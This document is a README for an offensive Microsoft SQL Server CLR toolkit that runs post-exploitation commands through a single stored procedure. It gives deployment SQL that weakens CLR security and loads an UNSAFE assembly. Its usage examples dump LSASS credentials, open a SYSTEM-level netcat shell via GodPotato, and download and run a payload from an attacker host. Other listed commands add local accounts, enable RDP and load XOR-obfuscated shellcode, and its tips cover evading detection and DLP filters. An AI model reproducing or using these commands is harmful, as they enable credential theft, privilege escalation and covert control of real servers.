# MSSQL CLR Operations Toolkit

Flexible Microsoft SQL Server CLR extension that exposes post-exploitation helpers (process management, file I/O, network recon, payload delivery, and privilege-escalation primitives) through a single stored procedure.

## Overview

`MSSQL CLR Operations Toolkit` packages a collection of high-impact operational
helpers inside a single UNSAFE CLR assembly. Once deployed, SQL operators can
issue commands via `EXEC dbo.ClrExec '<verb>'` to:

- Explore the host filesystem and running processes
- Stage, execute, or remove payloads without touching disk directly
- Trigger privilege-escalation exploits (EfsPotato/BadPotato/GodPotato)
- Interact with RDP settings, local accounts, and AV inventory
- Execute inline shellcode or assemblies with optional XOR staging

## Feature

| Capability | Command(s) | Notes |
| ---------- | ---------- | ----- |
| File & directory ops | `clr_pwd`, `clr_ls <path>`, `clr_cd <path>`, `clr_cat <file>`, `clr_rm <path>` | Uses .NET `System.IO`; handles nested directories and large outputs via chunking. |
| Process & network recon | `clr_ps`, `clr_netstat` | Enumerates processes and TCP listeners/connections. |
| Host reachability | `clr_ping <host>` | ICMP check with friendly status messaging. |
| Payload execution | `clr_cmd <cmd>`, `clr_exec -p <program> -a <args>` | Supports process execution with argument splitting. |
| Download/stage artifacts | `clr_download <url> <path>`, `clr_combine <baseFile>` | Downloader plus multipart combiner for split payloads. |
| Credential access | `clr_dumplsass [dumpDir]` | Dumps LSASS (admin only) and gzips output automatically. |
| User & RDP management | `clr_adduser <user> <pass>`, `clr_rdp` | Adds local accounts and toggles RDP via registry edits. |
| AV inventory | `clr_getav` | Enumerates installed AV products. |
| Privilege escalation | `clr_efspotato`, `clr_badpotato`, `clr_godpotato` | Exposes the Potato exploit family; supports inline command or binary launch. |
| Shellcode/assembly loaders | `clr_scloader`, `clr_assembly <payload> <xorKey>` | Execute XOR-encoded shellcode or managed assemblies from disk/base64. |

## Notes
- **Namespace split**:
  - `CLR_module/*`: operational helpers (filesystem, process, exploit glue).
  - `NativeAPI/*`: COM/DCOM marshaling types used by GodPotato.
  - `PingCastle/*`: RPC helpers ported from PingCastle for LSARPC/NRPC calls.
- **Permission set**: The project intentionally compiles with
  `PERMISSION_SET = UNSAFE` to unlock unmanaged calls (`dbghelp`, registry,
  raw sockets, etc.).
- **Output handling**: Long responses are chunked into 4,000-character blocks
  to respect SQLCLR pipe limits.
- **Exploit shims**: EfsPotato, BadPotato, and GodPotato wrappers support both
  direct command execution and program+arguments mode (via `-p`/`-a` flags).


## Prerequisites

- Windows host with SQL Server 2016+ (CLR integration enabled).
- Visual Studio 2022 with SQL Server Data Tools (SSDT).
- Sysadmin or equivalent privileges on the target SQL instance to deploy UNSAFE
  assemblies.

Optional helper tools: `sqlcmd` or SSMS for deployment steps, CLR integration
enabled at the SQL Server level.


## Building

- **Compile**  
   - Open `Database.sln`.
   - Build `Database` in `Release|AnyCPU`.  
     Output: `Database\bin\Release\Database.dll`.

## Deploying to SQL Server

```sql
-- 1. Enable CLR if needed
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE;

-- 2. Allow UNSAFE assemblies (if policy permits)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'clr strict security', 0;
RECONFIGURE;

-- 3. Load the assembly
CREATE ASSEMBLY [ClrOps]
FROM 'C:\path\to\Database.dll'
WITH PERMISSION_SET = UNSAFE;

-- 4. Bind the stored procedure
CREATE PROCEDURE dbo.ClrExec
(@cmd NVARCHAR(MAX))
AS EXTERNAL NAME [ClrOps].[StoredProcedures].[ClrExec];
GO
```

## Configuration

- **Working directory**: `clr_cd <path>` adjusts the process CWD for subsequent
  filesystem commands.
- **Dump directory**: `clr_dumplsass` defaults to `%SystemRoot%\Temp`. Supply a
  custom path for tight disk policies.
- **Potato execution**: Use `-p <binary> -a <args>` to launch arbitrary
  executables with SYSTEM privileges once escalation succeeds.
- **Shellcode loader**: Provide Base64 + XOR key pairs previously generated
  with your tooling to avoid static detection.

Environment-specific hardening (AppLocker, AMSI, EDR) may block certain verbs;
test in a lab that mirrors target policies.


## Usage Examples

```sql
-- Basic reconnaissance
EXEC dbo.ClrExec 'clr_pwd';
EXEC dbo.ClrExec 'clr_ls C:\ProgramData';
EXEC dbo.ClrExec 'clr_netstat';

-- Dump LSASS to a writable share
EXEC dbo.ClrExec 'clr_dumplsass \\fileserver\staging';

-- Execute a command with arguments
EXEC dbo.ClrExec 'clr_cmd powershell.exe -ExecutionPolicy Bypass -File c:\temp\audit.ps1';

-- Launch SYSTEM shell via GodPotato
EXEC dbo.ClrExec 'clr_godpotato -p c:\temp\nc64.exe -a 4444 -e cmd.exe';

-- Download and run payload
EXEC dbo.ClrExec 'clr_download https://attacker/payload.bin C:\Temp\payload.bin';
EXEC dbo.ClrExec 'clr_exec -p C:\Temp\payload.bin';
```


## Operational Tips

- **Output limits**: SQL Server truncates overly chatty responses. Keep command
  output concise or redirect to files retrieved later via `clr_cat`.
- **OpSec**: Combine `clr_download` + `clr_combine` to reassemble split payloads
  that bypass size/content DLP filters.
- **Error handling**: Most verbs emit `[!]` or `[X]` prefixed messages when the
  host denies access. Surface those to your operator console/log.
- **Cleanup**: Use `clr_rm` to delete staged binaries, dumps, or loader scraps.


## Troubleshooting

- `Msg 10314` / `UNSAFE assembly could not be loaded`: confirm `clr strict
  security` is disabled or that the DLL is signed and trusted.
- `Access denied` on LSASS dump or Potato exploits: the SQL Server service
  account lacks SeDebug/SeImpersonate privileges. Escalate the service context
  first.
- CLR procedure hangs: certain commands (e.g., long-running `clr_cmd`) block
  the session. Execute from a dedicated SQL connection and monitor with
  `sp_whoisactive`.

## Contributing

If you would like to contribute to this project, please leave a star in the repo.

## Disclaimer

This project is intended solely for educational purposes.


## License

This project is licensed under the **MIT License**. See the `LICENSE` file for details.
